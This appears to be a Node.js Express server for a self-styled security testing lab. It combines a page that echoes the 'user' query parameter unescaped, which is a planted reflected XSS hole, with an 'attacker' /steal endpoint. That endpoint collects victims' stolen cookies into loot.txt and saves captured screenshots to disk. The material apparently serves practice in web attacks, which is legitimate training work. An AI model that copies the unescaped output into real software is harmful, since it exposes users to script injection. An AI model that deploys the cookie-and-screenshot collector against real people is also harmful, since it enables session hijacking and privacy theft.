const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json({ limit: '50mb' }));

/**
 * 1. THE VICTIM ROUTE
 * Intentional Reflected XSS vulnerability via the 'user' parameter.
 */
app.get('/', (req, res) => {
    const user = req.query.user || "Guest";
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Aarya | Testing Environment</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            font-family: "Segoe UI", Tahoma, sans-serif;
            background: radial-gradient(circle at top, #0f172a, #020617);
            color: #e5e7eb;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: linear-gradient(180deg, #020617, #020617cc);
            border: 1px solid #1e293b;
            padding: 45px;
            border-radius: 16px;
            width: 100%;
            max-width: 520px;
            text-align: center;
            box-shadow: 0 0 40px rgba(34,211,238,0.15);
        }

        .badge {
            display: inline-block;
            background: rgba(34,211,238,0.1);
            color: #22d3ee;
            padding: 6px 14px;
            border-radius: 999px;
            font-size: 0.8rem;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
        }

        h1 {
            margin: 0;
            font-size: 2.2rem;
            color: #22d3ee;
        }

        h2 {
            margin-top: 6px;
            font-weight: 400;
            color: #94a3b8;
        }

        .divider {
            height: 1px;
            background: linear-gradient(to right, transparent, #1e293b, transparent);
            margin: 30px 0;
        }

        p {
            font-size: 0.95rem;
            color: #cbd5f5;
            line-height: 1.6;
        }

        .username {
            color: #38bdf8;
            font-weight: 600;
        }

        .btn-join {
            margin-top: 25px;
            background: linear-gradient(135deg, #22d3ee, #38bdf8);
            color: #020617;
            border: none;
            padding: 14px 32px;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.15s ease, box-shadow 0.15s ease;
            width: 100%;
        }

        .btn-join:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(34,211,238,0.35);
        }

        .footer {
            margin-top: 30px;
            font-size: 0.75rem;
            color: #64748b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="badge">SECURITY TESTING LAB</div>
        <h1>Aarya</h1>
        <h2>Testing Environment</h2>
        <div class="divider"></div>
        <p>
            Welcome <span class="username">${user}</span>,<br><br>
            This environment is intentionally vulnerable and is used for
            testing web application security controls and attack scenarios.
        </p>
        <button class="btn-join">Join Secure Session</button>
        <div class="footer">
            Authorized testing only · Activity may be monitored
        </div>
    </div>
</body>
</html>
    `);
});

/**
 * 2. THE ATTACKER ROUTE (Data Exfiltration)
 */
app.post('/steal', (req, res) => {
    try {
        const { image, cookies } = req.body;
        if (image) {
            const base64Data = image.replace(/^data:image\/png;base64,/, "");
            const filename = `stolen_${Date.now()}.png`;
            fs.writeFileSync(path.join(__dirname, filename), base64Data, 'base64');
            console.log(`\x1b[32m[+] SUCCESS: Captured ${filename}\x1b[0m`);
        }
        if (cookies) {
            console.log(`\x1b[33m[!] COOKIES STOLEN:\x1b[0m ${cookies}`);
            fs.appendFileSync(path.join(__dirname, 'loot.txt'), `[${new Date().toISOString()}] Cookies: ${cookies}\n`);
        }
        res.status(200).send("Received");
    } catch (err) {
        console.error("[-] Error processing data:", err);
        res.status(500).send("Error");
    }
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log('====================================');
    console.log(`\x1b[36mCombined Lab Server is ONLINE\x1b[0m`);
    console.log(`Internal Port: ${PORT}`);
    console.log('====================================');
});